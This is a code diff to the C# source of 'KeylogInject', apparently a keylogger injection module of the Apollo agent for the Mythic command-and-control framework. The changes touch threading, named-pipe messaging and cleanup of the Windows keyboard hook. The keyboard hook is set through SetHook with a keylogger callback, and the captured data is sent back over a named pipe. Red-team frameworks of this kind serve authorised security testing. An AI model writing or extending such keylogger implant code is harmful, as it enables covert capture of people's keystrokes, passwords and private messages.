@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 using ApolloInterop.Classes.Collections;
 using ApolloInterop.Structs.ApolloStructs;
 using ApolloInterop.Serializers;
-using System.Threading.Tasks;
+using ST=System.Threading.Tasks;
 using System.Threading;
 using System.Windows.Forms;
 using static KeylogInject.Native;
@@ -15,6 +15,7 @@ using ApolloInterop.Classes;
 using System.IO.Pipes;
 using ApolloInterop.Interfaces;
 using ApolloInterop.Constants;
+using ApolloInterop.Structs.MythicStructs;
 
 namespace KeylogInject
 {
@@ -30,14 +31,16 @@ namespace KeylogInject
         private static bool _completed = false;
         private static AutoResetEvent _completeEvent = new AutoResetEvent(false);
         private static JsonSerializer _jsonSerializer = new JsonSerializer();
-        
-        private static Task _sendTask = null;
+       
+
+        private static ST.Task _sendTask = null;
         private static Action<object> _sendAction = null;
 
-        private static Task _flushTask = null;
+        private static ST.Task _flushTask = null;
         private static Action _flushAction = null;
 
         private static IntPtr _hookIdentifier = IntPtr.Zero;
+        private static Thread _appRunThread;
 
         static void Main(string[] args)
         {
@@ -66,7 +69,6 @@ namespace KeylogInject
                         ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, ps);
                     }
                 }
-                ps.Flush();
                 ps.Close();
             });
             _server = new AsyncNamedPipeServer(_namedPipeName, null, 1, IPC.SEND_SIZE, IPC.RECV_SIZE);
@@ -84,20 +86,15 @@ namespace KeylogInject
             t.SetApartmentState(ApartmentState.STA);
             t.Start();
             _hookIdentifier = SetHook(Keylogger.HookCallback);
-            try
-            {
-                Application.Run();
-            }
-            catch
-            {
-
-            }
-            UnhookWindowsHookEx(_hookIdentifier);
+            Application.Run();
         }
 
         private static void ServerDisconnect(object sender, NamedPipeMessageArgs e)
         {
+            UnhookWindowsHookEx(_hookIdentifier);
             _completed = true;
+            _cts.Cancel();
+            Application.Exit();
             _completeEvent.Set();
         }
 
@@ -131,7 +128,7 @@ namespace KeylogInject
                 args.Pipe.Close();
                 return;
             }
-            _sendTask = new Task(_sendAction, null);
+            _sendTask = new ST.Task(_sendAction, args.Pipe);
             _sendTask.Start();
             Thread t = new Thread(StartKeylog);
             t.Start();
